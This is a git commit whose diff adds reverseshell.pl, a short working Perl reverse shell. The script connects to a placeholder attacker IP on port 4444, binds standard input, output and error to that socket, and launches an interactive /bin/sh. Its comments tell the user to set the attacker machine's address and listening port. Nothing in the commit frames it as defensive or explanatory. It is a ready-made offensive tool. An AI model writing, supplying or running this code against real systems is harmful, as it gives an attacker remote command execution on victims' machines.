befee3be7fa7d1f31a238f78468b3230c84da80a
Widgeon <91209299+widgeonsway@users.noreply.github.com>
2023-02-15 17:42:43 -0700

    Create reverseshell.pl

---
+++ reverseshell.pl
@@ -0,0 +1,12 @@
+#!/usr/bin/perl
+use Socket;
+
+$ip = "10.10.10.10";   # Change this to the IP address of your attacker machine
+$port = 4444;          # Change this to the port number that the attacker listens on
+
+socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or die "Can't create socket: $!";
+connect(SOCK, sockaddr_in($port, inet_aton($ip))) or die "Can't connect: $!";
+open(STDIN, ">&SOCK");
+open(STDOUT, ">&SOCK");
+open(STDERR, ">&SOCK");
+exec("/bin/sh -i");
